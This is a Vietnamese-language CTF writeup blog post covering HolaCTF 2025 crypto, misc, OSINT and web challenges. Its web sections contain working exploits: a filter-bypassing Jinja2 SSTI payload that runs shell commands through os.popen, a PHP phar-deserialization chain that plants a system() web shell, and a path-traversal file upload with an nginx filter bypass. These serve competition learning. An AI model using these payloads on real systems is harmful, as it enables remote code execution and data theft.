---
title: HolaCTF 2025
published: 2025-08-07
description: "Writeup for HolaCTF 2025."
image: "./image.png"
tags: ["Blog", "Web", "Crypto", "Misc"]
category: Writeup
draft: false
---


## Crypto/Cs2RTrash

Ở đề này ta được cho 3 bản mã c1, c2, c3 với cùng một message và cùng e = 65537. Quan sát thấy n1 là số nguyên tố => có thể tính φ(n1) = n1 - 1 rồi đảo e để lấy d.
Sau đó chỉ cần giải mã c1 với d này là thu được flag.

```python
from Crypto.Util.number import long_to_bytes, inverse 
e = 65537 
n1 = 106274132069853085771962684070654057294853035674691451636354054913790308627721 
c1 = 40409669713698525444927116587938485167766997176959778633087672968720888190012 
d = inverse(e, n1 - 1) 
flag = pow(c1, d, n1) 
print("Flag: " + long_to_bytes(flag).decode())
```

Flag: HOLACTF{ju5t_a_b4s1c_CRT}

## Crypto/ImLosingYou

Với e=2, ciphertext chỉ là c ≡ m² (mod n). Đề cung cấp thêm mod_m = m - r với r nhỏ (80 bit). Từ đó lập đa thức (mod_m + r)² - c ≡ 0 (mod n) và áp dụng Coppersmith để tìm nghiệm nhỏ.

Solve script sage:

```python
from sage.all import *
n = 5655306554322573090396099186606396534230961323765470852969315242956396512318053585607579359989407371627321079880719083136343885009234351073645372666488587
c = 249064480176144876250402041707185886135379496538171928784862949393878232927200977890895568473400681389529997203697206006850790029940405682934025
mod_m = 499063603337435213780295973826237775412685978121823376141602090122856806

R = PolynomialRing(Zmod(n), names=('r',))
r = R.gen()
a = 2 * mod_m
b = mod_m**2 - c
f = r**2 + a*r + b

roots = f.small_roots(X=2**80)

r_val = roots[0]
print(f"Found r: {r_val}")

m = mod_m + r_val
print(f"Recovered m: {m}")

try:
    from Crypto.Util.number import long_to_bytes
    flag = long_to_bytes(int(m))
    print(f"Flag: {flag.decode()}")
except:
    print(f"Flag bytes: {long_to_bytes(int(m))}")
```

Flag: HOLACTF{f33ls_l1k3_l0s1ng_h3r}

## Misc/Weird png

Trong file PNG ẩn một chuỗi opcode x86 dạng mov ax, imm; xor ax, imm; push ax. Mỗi cặp lệnh thực chất đẩy 1 word (2 byte ASCII little-endian) lên stack, sau đó đảo ngược thứ tự stack ta thu được chuỗi ký tự.
Dùng script parse hex, decode các word rồi đảo ngược, cuối cùng ghép lại ra flag:

```python
hex_str = """89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 00 00 00 FF 00 00 00 FF 08 02 00 00 00 00 00 00 00 8C C8 8E D8 8E C0 B8 C0 07 8E D0 BC 00 7C 83 EC 01 89 E5 C6 46 00 00 B8 5F 7D 50 B8 32 37 50 B8 5F 37 50 B8 21 40 35 12 12 50 B8 BC CC 35 88 88 50 B8 A8 A9 35 99 99 50 B8 5B 78 35 0F 27 50 B8 07 5C 35 37 13 50 B8 28 15 35 77 77 50 B8 5C 30 35 69 69 50 B8 53 48 35 60 09 50 B8 64 59 35 22 22 50 B8 52 45 35 11 11 50 B8 6D 02 35 21 43 50 B8 7C 5D 35 34 12 50 89 E5 8A 46 00 45 08 C0 74 0A B4 0E B7 00 B3 07 CD 10 EB EE EB FE ... 55 AA"""
data = bytes(int(t,16) for t in hex_str.split() if all(c in '0123456789abcdefABCDEF' for c in t))
start = data.find(bytes.fromhex('C6 46 00 00')) + 4
pairs = []
i = start
while not (data[i]==0x89 and data[i+1]==0xE5):
    assert data[i]==0xB8
    ax = data[i+2]<<8 | data[i+1]; i+=3
    if data[i]==0x35:
        ax ^= (data[i+2]<<8 | data[i+1]); i+=3
    assert data[i]==0x50; i+=1
    pairs.append((ax&0xFF, ax>>8))
out = bytearray()
for lo,hi in reversed(pairs): out += bytes([lo,hi])
print(out.decode('latin-1'))
```

Chạy script và ta có flag: HOLACTF{3A5Y_buT_l0AD3R_727_}

## OSINT/EHC is my family

Trường Đại học Công nghệ thông tin và Truyền thông Việt- Hàn

## Misc/Sanity Check

Bật F12 và tìm kiếm flag

![image](https://hackmd.io/_uploads/S1-6l4W5lg.png)

## Misc/LunaDB

Bài này chỉ cần đọc flag note là note có ID 7272 có chữ "This is real flag" và key nằm ở footer của database và decrypt thôi

Hàm decrypt des-ecb của mình

```rust
use openssl::symm::{decrypt, Cipher};

fn decrypt_des_ecb_no_pad(key: &[u8], data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let cipher = Cipher::des_ecb();
    let mut decrypted = decrypt(cipher, key, None, data)?;
    while decrypted.last() == Some(&0) {
        decrypted.pop();
    }
    Ok(decrypted)
}
```
## Misc/Regex

Đầu tiên regex sẽ luôn có 1 đoạn trông như thế này có nghĩa là độ dài chuỗi là 10
```
(?=.{10}$)
```

Script solve regex:
```python
def solve_regex(pattern: str) -> str:
    m = re.search(r"\(\?=.\{(\d+)\}\$\)", pattern)
    if not m:
        raise ValueError("Length not found in pattern")
    length = int(m.group(1))
    result = ["A"] * length  # fill with placeholders

    # fixed single chars
    for m in re.finditer(r"\(\?=.\{(\d+)\}([^\[\)])\)", pattern):
        pos, char = int(m.group(1)), m.group(2)
        if pos < length:
            result[pos] = char

    # fixed set [abc]
    for m in re.finditer(r"\(\?=.\{(\d+)\}\[([^\]]+)\]\)", pattern):
        pos, choices = int(m.group(1)), m.group(2)
        if pos < length:
            result[pos] = choices[0]

    # named group backref with choices
    for m in re.finditer(r"\(\?=.\{(\d+)\}\(\?P<(\w+)>\[([^\]]+)\]\).\{(\d+)\}\(\?P=\2\)\)", pattern):
        start = int(m.group(1))
        choices = m.group(3)
        offset = int(m.group(4))
        if start < length and start + 1 + offset < length:
            ch = choices[0]
            result[start] = ch
            result[start + 1 + offset] = ch

    # named group backref with exact char
    for m in re.finditer(r"\(\?=.\{(\d+)\}\(\?P<(\w+)>(.)\).\{(\d+)\}\(\?P=\2\)\)", pattern):
        start = int(m.group(1))
        ch = m.group(3)
        offset = int(m.group(4))
        if start < length and start + 1 + offset < length:
            result[start] = ch
            result[start + 1 + offset] = ch

    # variant with {0}
    for m in re.finditer(r"\(\?=.\{(\d+)\}\(\?P<(\w+)>(.)\).\{0\}\(\?P=\2\)\)", pattern):
        start = int(m.group(1))
        ch = m.group(3)
        if start < length and start + 1 < length:
            result[start] = ch
            result[start + 1] = ch

    return "".join(result)
```



## Web/Magic Random

Source của web:

```python
from flask import Flask, render_template, request, url_for, render_template_string, jsonify
import random
import re

app = Flask(__name__)
RANDOM_SEED=random.randint(0,50)
PORT = 4321

attack_types = {
    "normal_attack": {
        "name": "Normal Attack",
        "description": "Use your staff to bonk enemy 🪄",
        "damage": random.randint(1, 10),
        "type": "attack",
        "cooldown": 0
    },
    "power_of_friendship": {
        "name": "Power of Friendship",
        "description": "Friendship is power 🫶",
        "damage": random.randint(11, 30),
        "type": "attack",
        "cooldown": 3
    },
    "holy_heal": {
        "name": "Holy Heal",
        "description": "Heal a little hp ❤️",
        "damage": random.randint(10, 20),
        "type": "heal",
        "cooldown": 3
    }
}

def valid_template(template):
    pattern = r"^[a-zA-Z0-9 ]+$"    
    if not re.match(pattern, template):
        random.seed(RANDOM_SEED) 
        char_list = list(template)
        random.shuffle(char_list)
        template = ''.join(char_list)
    return template

def special_filter(user_input):
    simple_filter=["flag", "*", "\"", "'", "\\", "/", ";", ":", "~", "`", "+", "=", "&", "^", "%", "$", "#", "@", "!", "\n", "|", "import", "os", "request", "attr", "sys", "builtins", "class", "subclass", "config", "json", "sessions", "self", "templat", "view", "wrapper", "test", "log", "help", "cli", "blueprints", "signals", "typing", "ctx", "mro", "base", "url", "cycler", "get", "join", "name", "g.", "lipsum", "application", "render"]
    for char_num in range(len(simple_filter)):
        if simple_filter[char_num] in user_input.lower():
            return False
    return True
    
@app.route("/")
def dashboard():
    return render_template("dashboard.html")

@app.route("/api/list_attack_types")
def list_attack_types():
    return jsonify(attack_types)

@app.route("/api/cast_attack")
def cast_attack():
    attack_name = request.args.get("attack_name", "")
    if attack_name in attack_types:
        attack = attack_types[attack_name]
        return jsonify(attack)
    else:
        try:
            attack_name=valid_template(attack_name)
            if not special_filter(attack_name):
                return jsonify({"error": "Creating magic is failed"}), 404
            template=render_template_string("<i>No magic name "+attack_name+ " here, try again!</i>")    
            return jsonify({"error": template}), 404
        except Exception as e:
            return jsonify({"error": "There is something wrong here: "+str(e)}), 404

if __name__ == "__main__":
    print(f"Random seed: {RANDOM_SEED}")
    app.run(host="0.0.0.0", port=PORT)
```

Có thể thấy hàm render_template_string trong `/api/cast_attack` có thể gây ra lỗi SSTI. Nhưng trước khi đó thì `attack_name` phải đi qua hàm và bị shuffle có seed

```python
def valid_template(template):
    pattern = r"^[a-zA-Z0-9 ]+$"    
    if not re.match(pattern, template):
        random.seed(RANDOM_SEED) 
        char_list = list(template)
        random.shuffle(char_list)
        template = ''.join(char_list)
    return template
```

Và seed là `RANDOM_SEED=random.randint(0,50)`, vì seed khá nhỏ nên chúng ta có thể bruteforce. Tiếp theo là phần SSTI, chúng ta phải vượt qua filter sau:

```python
def special_filter(user_input):
    simple_filter=["flag", "*", "\"", "'", "\\", "/", ";", ":", "~", "`", "+", "=", "&", "^", "%", "$", "#", "@", "!", "\n", "|", "import", "os", "request", "attr", "sys", "builtins", "class", "subclass", "config", "json", "sessions", "self", "templat", "view", "wrapper", "test", "log", "help", "cli", "blueprints", "signals", "typing", "ctx", "mro", "base", "url", "cycler", "get", "join", "name", "g.", "lipsum", "application", "render"]
    for char_num in range(len(simple_filter)):
        if simple_filter[char_num] in user_input.lower():
            return False
    return True
```

Vì filter khá chặt nên mình xài 1 tool để gen payload: https://github.com/Marven11/Fenjing

![image](https://hackmd.io/_uploads/SkXTYmb9gg.png)

Ok và đã có payload SSTI để đọc flag nhưng vẫn còn bị dính `cycler` nên mình đổi thành `range`. Và payload SSTI cuối cùng mình có được là:

```python
{{(_1919.__eq__.__globals__[((((1).__mod__.__doc__[11]).__add__(range.__doc__[25])).__mul__(3)).__mod__((115,121,115))].modules[((((1).__mod__.__doc__[11]).__add__(range.__doc__[25])).__mul__(2)).__mod__((111,115))].popen(((((1).__mod__.__doc__[11]).__add__(range.__doc__[25])).__mul__(9)).__mod__((99,97,116,32,102,108,97,103,42)))).read()}}
```

script để tìm seed

```python
import random

# paste vào /api/cast_attck
input_str = "abcd123456789vaca{sfwwsasvczcXYZxyz0987654321moreTEXT{}"

# lấy từ response của request trên
server_output = "s3x45ZET6Ty26b9dmcs{0}89a4zvXca2avYfw{ws877crX1a13oezc5"

def shuffle_with_seed(s, seed):
    random.seed(seed)
    chars = list(s)
    random.shuffle(chars)
    return ''.join(chars)

candidates = []
for seed in range(51):
    result = shuffle_with_seed(input_str, seed)
    if result == server_output:
        candidates.append(seed)

print("seeds:", candidates)
```

solve script để gửi payload

```python
import random
import requests

URL = "http://127.0.0.1:5000/"
RANDOM_SEED = 43
target = "{{(_1919.__eq__.__globals__[((((1).__mod__.__doc__[11]).__add__(range.__doc__[25])).__mul__(3)).__mod__((115,121,115))].modules[((((1).__mod__.__doc__[11]).__add__(range.__doc__[25])).__mul__(2)).__mod__((111,115))].popen(((((1).__mod__.__doc__[11]).__add__(range.__doc__[25])).__mul__(9)).__mod__((99,97,116,32,102,108,97,103,42)))).read()}}"

def shuffle_indices(n, seed):
    random.seed(seed)
    idx = list(range(n))
    random.shuffle(idx)
    return idx

def unshuffle(shuffled_message, key):
    random.seed(key)
    l = list(range(len(shuffled_message)))
    random.shuffle(l)
    out = [None] * len(shuffled_message)
    for i, x in enumerate(l):
        out[x] = shuffled_message[i]
    return ''.join(out)

session = requests.Session()
r = session.get(URL)

candidate = unshuffle(target, RANDOM_SEED)
r = session.get(URL + "api/cast_attack", params={"attack_name": candidate})
print(r.text)
```

## Web/hell_ehc

Chúng ta có thể thấy class Logger có khả năng ghi vào file -> ghi vào file PHP -> RCE

```php
class Logger
{
    public function __destruct()
    {
        $request_log = fopen($this->logs , "a");
        fwrite($request_log, $this->request);
        fwrite($request_log, "\r\n");
        fclose($request_log);
    }
}
```

Nhưng unserialize() chỉ chấp nhận hàm LogFile và User. Ngó lại hàm LogFile có thể thấy một file access function

```php
class LogFile
{
    public $filename;
    
    public function __destruct()
    {
        return md5_file($this->filename);
    }
}
```

Cộng thêm với việc server sử dụng PHP7.4 nên mình chắc chắn đây là lỗi Phar Deserialization

Script tạo phar file

```php
<?php
class Logger {
	public $logs = "./logMD5.php";
	public $request = "<?php system('cat /flag.txt');?>";
}
$obj = new Logger();
$phar = new Phar("aaa.phar");
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($obj);
$phar->stopBuffering();
?>
```

Script tạo serialize của LogFile

```php
<?php

class LogFile
{
    public $filename = "phar://upload/winky/aaa.png";
    public $username = "ok";
}
$a = new LogFile();
echo base64_encode(serialize($a));

?>
```

## Web/another_hell_ehc

Bài này có 2 filter ở nginx và trong PHP nhưng đều có 2 cách filter khác nhau

Tuy nhiên chúng ta có thể bypass filter của nginx `if ($args ~ "page=upload")`. Ở đây ta đổi thành URL encode là sẽ vượt qua

`POST /index.php?page=%75pload`

Ta up một file có path traversal lên

```
POST /index.php?page=%75pload HTTP/1.1
Host: 127.0.0.1:49928
Content-Length: 224
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD2405lXP1DjzWdZo
Cookie: user=Tzo3OiJMb2dGaWxlIjoyOntzOjg6ImZpbGVuYW1lIjtzOjI3OiJwaGFyOi8vdXBsb2FkL3dpbmt5L2FhYS5wbmciO3M6ODoidXNlcm5hbWUiO3M6Mjoib2siO30%3D; PHPSESSID=mblckk7aduamaffbim3vo6jdug

------WebKitFormBoundaryD2405lXP1DjzWdZo
Content-Disposition: form-data; name="avatar"; filename="../../ccc.png.php"
Content-Type: image/png

<?php system("cat /flag.txt");?>
------WebKitFormBoundaryD2405lXP1DjzWdZo--
```

![image](https://hackmd.io/_uploads/ByOzy4-9ge.png)

## web/Sanity Check

Chúng ta có thể dùng dict để bypass như sau

```python
import requests
import json
URL = "http://127.0.0.1:65180/"

data = {
    "data":{}
}

for i in range(1, 513):
    data["data"]['0'*i] = 'Holactf'

session = requests.Session()
user = {
    'username':'bbbb'
}
r = session.post(URL, data=user)
r = session.post(URL + "update", json=data)
print(r.text)
```

Khi này web sẽ duyệt qua dict và json dumps có chữ Holactf. Và vì '0' != '00' nhưng int('0') == int('00') = 0 nên sẽ không bị chặn


